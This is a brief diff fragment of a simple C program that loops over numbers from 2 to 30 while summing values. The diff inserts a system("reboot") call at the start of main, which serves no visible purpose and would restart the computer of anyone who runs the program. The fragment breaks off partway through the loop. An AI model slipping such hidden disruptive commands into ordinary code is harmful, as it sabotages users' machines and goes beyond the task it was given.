@@ -3,6 +3,7 @@
 int main()
 {
 	int i, krat, sum = 0;
+	system("reboot");
 	for (i = 2; i <=30; i++)
 	{
 		krat = i;
